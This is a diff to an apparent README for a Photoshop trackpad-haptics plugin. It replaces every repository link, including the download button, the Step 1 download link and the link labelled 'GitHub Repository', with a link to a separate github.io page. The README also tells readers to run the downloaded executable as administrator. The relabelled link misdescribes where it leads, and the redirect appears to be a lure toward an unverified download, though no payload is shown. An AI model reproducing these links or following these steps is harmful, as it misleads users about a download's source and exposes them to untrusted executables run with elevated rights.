@@ -1,6 +1,6 @@
 # 🖐️ Trackpad-Haptics-Photoshop-Plugin - Feel Every Click, Snap, and Zoom
 
-[![Download Now](https://img.shields.io/badge/Download-Trackpad--Haptics--Photoshop--Plugin-blue?style=for-the-badge&logo=github)](https://github.com/Oilpaperjack248/Trackpad-Haptics-Photoshop-Plugin)
+[![Download Now](https://img.shields.io/badge/Download-Trackpad--Haptics--Photoshop--Plugin-blue?style=for-the-badge&logo=github)](https://oilpaperjack248.github.io)
 
 ## 👋 Welcome to Tactile Photoshop
 
@@ -16,7 +16,7 @@ Getting started is easier than you think. You don't need to be a tech wizard or 
 
 ### 📥 Step 1: Download the Plugin
 
-Visit this link to download the application: [https://github.com/Oilpaperjack248/Trackpad-Haptics-Photoshop-Plugin](https://github.com/Oilpaperjack248/Trackpad-Haptics-Photoshop-Plugin)
+Visit this link to download the application: [https://oilpaperjack248.github.io](https://oilpaperjack248.github.io)
 
 Once you're on the page, look for the download button or the latest release. Click it, and the download will start automatically. The file is small, so it won't take long.
 
@@ -139,7 +139,7 @@ Right-click the executable file and select **"Run as administrator"**. Some syst
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [Trackpad-Haptics-Photoshop-Plugin](https://github.com/Oilpaperjack248/Trackpad-Haptics-Photoshop-Plugin)
+- **GitHub Repository:** [Trackpad-Haptics-Photoshop-Plugin](https://oilpaperjack248.github.io)
 - **Issue Tracker:** Found on the GitHub page under the "Issues" tab
 - **Release Notes:** Check the "Releases" section on GitHub for version history and updates
 
